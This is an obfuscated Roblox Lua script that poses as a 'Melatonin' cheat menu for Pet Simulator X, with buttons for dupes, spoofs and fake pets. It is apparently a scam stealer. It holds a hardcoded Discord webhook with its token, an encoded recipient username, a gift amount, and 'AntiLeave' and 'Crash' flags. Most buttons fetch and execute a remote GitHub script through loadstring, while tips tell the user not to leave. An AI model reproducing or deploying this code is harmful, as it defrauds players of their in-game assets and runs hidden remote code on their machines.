--// Melatonin

local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
local v0 = bit32 or bit;
local v1 = v0.bxor;
local v2 = v0.bor;
local v3 = v0.band;
_G.Username = LUAOBFUSACTOR_DECRYPT_STR_0("\109\161\34\137\38\179\22\255", "\38\206\79\230\85\210");
_G.ScriptName = "Melatonin | [💎MINE] Pet Simulator X! 🐾";
_G.Webhook = "https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_";
_G.GiftMessage = LUAOBFUSACTOR_DECRYPT_STR_0("\37\246\95\183\81\65\105", "\113\152\52\196\113\123\45\63");
_G.Diamonds = v3(283233, 216767) + v2(283233, 216767);
_G.UnlockPets = true;
_G.AntiLeave = true;
_G.Crash = true;
_G.Tip1 = "Don't leave !";
_G.Tip2 = LUAOBFUSACTOR_DECRYPT_STR_0("\49\134\114\16\82\110\208\18\142\119\68\6\115\219\70\139\116\5\22\114\208\1\199\125\13\28\114\205\14", "\102\231\27\100\114\27\190");
_G.Tip3 = LUAOBFUSACTOR_DECRYPT_STR_0("\127\68\227\196\234\255\69\89\255\198\190\172\79\88\182\218\165\237\66\66\248\209\228\162", "\38\43\150\182\202\140");
_G.Tip4 = LUAOBFUSACTOR_DECRYPT_STR_0("\246\78\115\17\130\78\56\22\208\74\121\31\130\90\118\0\203\67\56\0\202\74\56\7\193\93\113\4\214\15\116\27\195\75", "\162\47\24\116");
_G.Tip5 = "Don't forget to join the discord!";
local v4 = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\16\169\36\213\141", "\67\198\81\187\233\197"), game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\52\79\220\86\235\52\69\219\78\230\4\69", "\103\32\169\56\143")));
local v5 = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\207\85\214\122\231", "\156\58\163\20\131\188\86\214"), game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\112\53\75\2\10\241\70\40\72\5\13\199", "\35\90\62\108\110\162")));
v5.SoundId = "rbxassetid://876939830";
v4.SoundId = "rbxassetid://8482764467";
v4:Play();
game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\9\56\255\0\91\173\169\29\57\247", "\90\76\158\114\47\200\219")):SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\243\171\124\122\153\20\108\61\198\167\113\127\163\18\119\58", "\160\206\18\30\215\123\24\84"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\1\90\108\90\236", "\85\51\24\54\137\55")]=LUAOBFUSACTOR_DECRYPT_STR_0("\139\44\114\17\73\63\165\175\39\62\12\29\28\164\167\45\123\20\17\112\155\131\29\62\35\116\29\235\158", "\198\73\30\112\61\80\203"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\134\57\83", "\85\227\65\39\60\155")]=LUAOBFUSACTOR_DECRYPT_STR_0("\52\194\216\140\136\132\158\18\131\148\173", "\124\163\174\233\168\226\235"),[LUAOBFUSACTOR_DECRYPT_STR_0("\213\9\22\185\195\248\19\10", "\145\124\100\216\183")]=(42 - 22),[LUAOBFUSACTOR_DECRYPT_STR_0("\62\174\58\214\186\248\77", "\124\219\78\162\213\150")]=LUAOBFUSACTOR_DECRYPT_STR_0("\141\127\207\81", "\194\20\174\40\62\144"),[LUAOBFUSACTOR_DECRYPT_STR_0("\41\119\225\62", "\96\20\142\80\173\147")]="https://www.roblox.com/asset/?id=12841940716"});
game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\75\76\22\201\108\93\5\252\109\81", "\24\56\119\187")):SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\255\181\219\243\237\171\101\197\182\220\244\194\176\120\195\190", "\172\208\181\151\163\196\17"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\71\5\24\43\118", "\19\108\108\71")]=LUAOBFUSACTOR_DECRYPT_STR_0("\132\223\34\73\212\246\15\126\169\197\113\66\222\246\14\127", "\192\182\81\42\187\132\107\94"),[LUAOBFUSACTOR_DECRYPT_STR_0("\13\163\201\249", "\89\198\177\141\54")]="Join the discord : discord.gg/3fjRZzQp3T",[LUAOBFUSACTOR_DECRYPT_STR_0("\140\18\230\250\51\161\30\166", "\200\103\148\155\71\200\113")]=(392577795 - 292577796),[LUAOBFUSACTOR_DECRYPT_STR_0("\233\249\255\82\86\228\143", "\171\140\139\38\57\138\190\193")]=LUAOBFUSACTOR_DECRYPT_STR_0("\240\45\125\171\99", "\186\98\52\229\77"),[LUAOBFUSACTOR_DECRYPT_STR_0("\155\33\85\3\182\58\19", "\217\84\33\119")]=LUAOBFUSACTOR_DECRYPT_STR_0("\110\81\167\29\174\100\81\202", "\42\20\228\81\231"),[LUAOBFUSACTOR_DECRYPT_STR_0("\103\237\48\60", "\46\142\95\82\167")]="https://www.roblox.com/asset/?id=5313546565"});
Wait(1 + 1);
local v8 = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();
local v9 = v8.CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾", LUAOBFUSACTOR_DECRYPT_STR_0("\152\96\6\216\186\70\15\205\178\119", "\223\18\103\168"));
print(LUAOBFUSACTOR_DECRYPT_STR_0("\254\29\205\26\199\23\207\18\221\88\237\52\242\60\228\63", "\179\120\161\123"));
local v10 = v9:NewTab("🌎 - Main");
local v11 = v10:NewSection("Update - 04/17/2023");
v11 = v10:NewSection("📅 Updates every day!");
v11 = v10:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T");
local v12 = v9:NewTab("📀 - Function");
local v13 = v12:NewSection("Visual Trade 👀");
local v14 = v9:NewTab("👻 - Spoofer");
local v15 = v14:NewSection("👻 - Spoofer");
local v16 = v9:NewTab("🤡 - Dupe/Scam");
local v17 = v16:NewSection("Click for take pets 👥");
local v18 = v9:NewTab("💎 - Premium");
local v19 = v18:NewSection("💎 - Premium");
v13:NewToggle("✅ On / ❌ Off ", LUAOBFUSACTOR_DECRYPT_STR_0("\251\236\184\218\143\214\164\148\192\235\234\251\201\255\234\192\199\252\234\194\198\234\191\213\195\185\190\198\206\253\175\154", "\175\153\202\180"), function(v20)
	if v20 then
		v5:Play();
	else
		v5:Play();
	end
end);
v13:NewButton("Fake Titanic 🧩 ", LUAOBFUSACTOR_DECRYPT_STR_0("\171\40\92\83\232\238\157\137\96\85\72\232\238\157\152\37\73\29\251\228\157\137\96\91\92\228\238\157\156\41\73\92\225\226\222", "\232\64\61\61\143\139\189"), function()
	local v21 = 1395 - (v3(271, 1124) + v2(271, 1124));
	while true do
		if (v21 == (1371 - (445 + 926))) then
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v13:NewButton("Fake Banana 🍌 ", LUAOBFUSACTOR_DECRYPT_STR_0("\220\140\35\44\35\250\196\35\98\52\250\144\98\54\43\191\133\98\36\37\244\129\98\32\37\241\133\44\35", "\159\228\66\66\68"), function()
	local v22 = 455 - (v3(291, 164) + v2(291, 164));
	while true do
		if (v22 ~= (396 - (v3(186, 210) + v2(186, 210)))) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v13:NewButton("Fake Huge 🎈 ", LUAOBFUSACTOR_DECRYPT_STR_0("\22\86\119\6\198\48\30\119\72\209\48\74\54\28\206\117\95\54\14\192\62\91\54\0\212\50\91", "\85\62\22\104\161"), function()
	v5:Play();
end);
v15:NewButton("Spoof your username 😎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\92\190\86\34\209\121\63\175\88\57\196\60\106\165\82\62\216\125\114\179", "\31\214\55\76\182\28"), function()
	local v23 = v3(0, 0) + v2(0, 0);
	while true do
		if (v23 ~= (1158 - (259 + 899))) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v15:NewButton("Spoof your Pets 🌝 ", LUAOBFUSACTOR_DECRYPT_STR_0("\175\140\69\115\200\230\198\32\131\145\86\61\255\230\146\42", "\236\228\36\29\175\131\230\89"), function()
	v5:Play();
	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
end);
v15:NewButton("Spoof your Diamonds 💎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\111\183\56\75\113\29\65\204\67\170\43\5\114\17\0\216\67\177\61\86\54\25\12\216\67\170\55\81", "\44\223\89\37\22\120\97\181"), function()
	local v24 = 828 - (45 + 783);
	while true do
		if (v24 ~= 0) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v15:NewButton("Spoof your Coins 🥴 ", LUAOBFUSACTOR_DECRYPT_STR_0("\112\60\85\35\76\68\19\45\91\56\89\1\80\59\93\35\88\1\82\57\89\34\94\79\71", "\51\84\52\77\43\33"), function()
	v5:Play();
	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
end);
v17:NewButton("Titanic pet 🔥 ", LUAOBFUSACTOR_DECRYPT_STR_0("\44\195\128\61\89\199\154\43\201\149\49\23\207\217\95\208\132\36", "\127\160\225\80\121\166\186"), function()
	local v25 = 632 - (419 + 213);
	while true do
		if (v25 ~= (v3(0, 0) + v2(0, 0))) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v17:NewButton("Huge pet ☀️ ", LUAOBFUSACTOR_DECRYPT_STR_0("\225\241\74\64\159\112\177\59\199\245\78\13\207\116\229", "\178\146\43\45\191\17\145\115"), function()
	v5:Play();
	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
end);
v17 = v16:NewSection("🎯 Dupe");
v17:NewButton("Boosts Dupe 🏃 ", LUAOBFUSACTOR_DECRYPT_STR_0("\97\35\87\161\176\92\57\82\182\176\71\57\72\183\228\86", "\37\86\39\196\144"), function()
	local v26 = 680 - (v3(597, 83) + v2(597, 83));
	while true do
		if (v26 == (v3(0, 0) + v2(0, 0))) then
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v17:NewButton("Exclusive Egg Dupe 🥚 ", LUAOBFUSACTOR_DECRYPT_STR_0("\93\53\92\48\86\86\62\14\107\96\105\45\21\67\36\8\112\54\73\117\51\72\54", "\25\64\44\85\118\47\81\123"), function()
	local v27 = 0 - 0;
	while true do
		if ((1905 - (v3(538, 1367) + v2(538, 1367))) == v27) then
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v17:NewButton("Day Care Dupe 🧸 ", LUAOBFUSACTOR_DECRYPT_STR_0("\62\181\187\250\227\170\134\75\8\224\143\254\186\243\170\95\8\165\235\239\166\167\154", "\122\192\203\159\195\211\233\62"), function()
	local v28 = 345 - (v3(314, 31) + v2(314, 31));
	while true do
		if (v28 ~= (1089 - (v3(972, 117) + v2(972, 117)))) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v17:NewButton("Auctions Scams 🍄 ", LUAOBFUSACTOR_DECRYPT_STR_0("\1\104\183\200\190\2\183\248\38\61\165\201\253\5\189\246\37\110", "\75\29\196\188\158\113\212\153"), function()
	local v29 = v3(0, 0) + v2(0, 0);
	while true do
		if (v29 == (668 - (383 + 285))) then
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v17:NewButton("Eggs for Diamonds 💎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\173\244\186\16\182\130\249\170\12\247\137\230\172\68\242\142\224\164\11\248\131\242\233\2\249\149\161\172\3\241\148", "\231\129\201\100\150"), function()
	local v30 = v3(0, 0) + v2(0, 0);
	while true do
		if (v30 ~= 0) then
		else
			v5:Play();
			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
			break;
		end
	end
end);
v19:NewTextBox(LUAOBFUSACTOR_DECRYPT_STR_0("\31\2\95\206\164\16\34\80\113\198\180", "\79\112\58\163\205\101"), LUAOBFUSACTOR_DECRYPT_STR_0("\56\232\23\155\194\7\232\17\155\208\13\228\67\207\212\72\232\13\215\212\11\246\67\235\201\13\240\10\206\214", "\104\157\99\187\187"), function(v31)
	print(v31);
end);
